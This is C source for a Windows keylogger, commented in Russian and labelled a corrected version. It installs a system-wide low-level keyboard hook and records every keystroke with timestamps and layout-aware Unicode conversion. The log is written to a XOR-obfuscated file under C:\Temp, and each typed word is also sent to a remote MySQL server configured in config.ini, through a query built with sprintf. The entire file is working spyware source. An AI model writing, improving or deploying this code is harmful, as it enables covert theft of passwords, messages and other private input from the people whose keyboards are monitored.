// keylogger.c (исправленная версия)
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <mysql.h>
#include <wctype.h> // Для функции iswspace

HHOOK g_hHook = NULL;
FILE *g_log = NULL;
MYSQL *g_conn = NULL;

#define IN 1 /* inside word */
#define OUT 0 /* outside word */
int state = OUT;

// Буфер для хранения слова
char g_word_buffer[256];
int g_word_buffer_index = 0;

// Структура для хранения конфигурации БД
struct DbConfig {
    char host[128];
    char user[128];
    char password[128];
    char database[128];
    char insert_query[256];
    char encryption_key[128];
} g_db_config;

// Отслеживает текущую позицию в файле для правильного применения XOR ключа
long g_encryption_pos = 0;

void send_word_to_db();

// Объявление новой функции для шифрования
void fputs_encrypted(const char* str, FILE* stream);

// Callback вызываемый при нажатии на клавишу
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN) {

            time_t mytime = time(NULL);
            struct tm *now = localtime(&mytime);
            char timestamp_str[30];
            strftime(timestamp_str, sizeof(timestamp_str), "%d.%m.%Y %H:%M:%S ", now);
            BYTE keys[256];
            GetKeyboardState(keys);

            // Получаем текущую раскладку клавиатуры для активного окна
            HWND foregroundWindow = GetForegroundWindow();
            DWORD threadId = GetWindowThreadProcessId(foregroundWindow, NULL);
            HKL keyboardLayout = GetKeyboardLayout(threadId);

            // Поддержка смены раскладки
            wchar_t unicode_char_buffer[2]; // Буфер для UTF-16 символа
            int result = ToUnicodeEx(pKey->vkCode, pKey->scanCode, keys, unicode_char_buffer, 2, 0, keyboardLayout);

            if (result > 0) {
                unicode_char_buffer[result] = L'\0'; // Завершаем строку

                // Проверяем, является ли символ пробелом, переносом строки и тд
                if (iswspace(unicode_char_buffer[0])) {
                    if (state == IN) {
                        send_word_to_db();
                        fputs_encrypted("\n", g_log);
                    }
                    state = OUT;
                } else {
                    if (state == OUT) {
                        state = IN;
                        fputs_encrypted(timestamp_str, g_log);
                    }

                    // Конвертируем UTF-16 (wchar_t) в UTF-8 (char) для записи в файл и БД
                    char utf8_buffer[5] = {0};
                    int bytes_written = WideCharToMultiByte(CP_UTF8, 0, unicode_char_buffer, -1, utf8_buffer, sizeof(utf8_buffer), NULL, NULL);

                    if (bytes_written > 1) { // >1, потому что включает нуль-терминатор
                        // Записываем UTF-8 символы в файл и буфер
                        fputs_encrypted(utf8_buffer, g_log);

                        // Добавляем в буфер слова, если есть место
                        int len = bytes_written - 1;
                        if (g_word_buffer_index + len < sizeof(g_word_buffer)) {
                            memcpy(&g_word_buffer[g_word_buffer_index], utf8_buffer, len);
                            g_word_buffer_index += len;
                        }
                    }
                }
                fflush(g_log);
            }
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

void send_word_to_db() {
    // Проверка на пустой буффер/отсутствие соединения
    if (g_word_buffer_index == 0 || g_conn == NULL) {
        g_word_buffer_index = 0;
        return;
    }

    // --- Проверка и переподключение к БД ---
    // mysql_ping проверяет, живо ли соединение. Если нет, пытается переподключиться.
    if (mysql_ping(g_conn) != 0) {
        fputs_encrypted("mysql_ping() failed. Connection lost and could not be re-established.\n", g_log);
        return; // Если переподключиться не удалось, выходим
    }

    g_word_buffer[g_word_buffer_index] = '\0'; // Завершаем строку в буффере

    // Используем шаблон запроса из конфига
    char final_query[1024];
    sprintf(final_query, g_db_config.insert_query, g_word_buffer);

    if (mysql_query(g_conn, final_query)) {
        // Формируем строку ошибки и шифруем ее перед записью
        char error_msg[512];
        sprintf(error_msg, "MYSQL Error: %s\n", mysql_error(g_conn));
        fputs_encrypted(error_msg, g_log);
        fflush(g_log);
    }
    g_word_buffer_index = 0; // Обнуляем буффер, чтобы принять новое слово в него
}

// Шифрование сохраняемого лога
void fputs_encrypted(const char* str, FILE* stream) {
    const char* key = g_db_config.encryption_key;
    size_t key_len = strlen(key);
    if (key_len == 0 || stream == NULL) {
        // Если ключ пустой или файла нет, ничего не делаем или пишем как есть
        if (stream) fputs(str, stream);
        return;
    }

    size_t str_len = strlen(str);
    for (size_t i = 0; i < str_len; i++) {
        // Шифруем каждый символ со сдвигом
        char encrypted_char = str[i] ^ key[g_encryption_pos % key_len];
        fputc(encrypted_char, stream);
        g_encryption_pos++;
    }
}

// Функция для чтения config.ini
void load_config(const char* filename) {
    FILE* file = fopen(filename, "r");
    if (!file) {
        MessageBox(NULL, "Не удалось найти config.ini", "Ошибка конфигурации", MB_OK | MB_ICONERROR);
        exit(1); // Завершаем программу, если конфига нет
    }

    char line[512];
    while (fgets(line, sizeof(line), file)) {
        char* key = strtok(line, "=");
        char* value = strtok(NULL, "\n");
        if (key && value) {
            if (strcmp(key, "host") == 0) strcpy(g_db_config.host, value);
            else if (strcmp(key, "user") == 0) strcpy(g_db_config.user, value);
            else if (strcmp(key, "password") == 0) strcpy(g_db_config.password, value);
            else if (strcmp(key, "database") == 0) strcpy(g_db_config.database, value);
            else if (strcmp(key, "insert_query") == 0) strcpy(g_db_config.insert_query, value);
            else if (strcmp(key, "encryption_key") == 0) strcpy(g_db_config.encryption_key, value);
        }
    }
    fclose(file);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    load_config("config.ini");

    // Открываем файл лога в бинарном режиме для дозаписи
    g_log = fopen("C:\\Temp\\keylog.xor", "ab");
    if (!g_log) {
        MessageBox(NULL, "Не удалось создать или открыть лог-файл C:\\Temp\\keylog.xor.\nУбедитесь, что директория C:\\Temp существует.", "Критическая ошибка", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Определяем текущий размер файла, чтобы продолжить шифрование с правильной позиции
    fseek(g_log, 0, SEEK_END);
    g_encryption_pos = ftell(g_log);

    // Записываем стартовое сообщение
    fputs_encrypted("\n Session Started \n", g_log);
    fflush(g_log);

    // Подключение к БД
    g_conn = mysql_init(NULL);
    if (!g_conn) {
        fputs_encrypted("mysql_init() failed. Aborting.\n", g_log);
        fclose(g_log);
        return 1;
    }

    if (mysql_real_connect(g_conn,
                           g_db_config.host,
                           g_db_config.user,
                           g_db_config.password,
                           g_db_config.database,
                           3306, NULL, 0) == NULL)
    {
        char error_msg[512];
        sprintf(error_msg, "mysql_real_connect() failed: %s\n", mysql_error(g_conn));
        fputs_encrypted(error_msg, g_log);
        mysql_close(g_conn);
        g_conn = NULL; // Указываем, что соединения нет
    } else {
        fputs_encrypted("Successfully connected to MySQL.\n", g_log);
        mysql_set_character_set(g_conn, "utf8mb4");
        fputs_encrypted("Character set switched to utf8mb4.\n", g_log);
    }
    fflush(g_log);

    // Устанавливаем хук на ВСЮ систему
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
    if (!g_hHook) {
        char error_msg[128];
        sprintf(error_msg, "SetWindowsHookEx() failed. Error: %lu\n", GetLastError());
        fputs_encrypted(error_msg, g_log);
        if (g_conn) mysql_close(g_conn);
        fclose(g_log);
        return 1;
    }

    // Запускаем цикл обработки сообщений
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Очистка
    UnhookWindowsHookEx(g_hHook);
    if (g_conn) {
        fputs_encrypted("--- Closing MySQL connection. ---\n", g_log);
        mysql_close(g_conn);
    }
    fclose(g_log);
    return 0;
}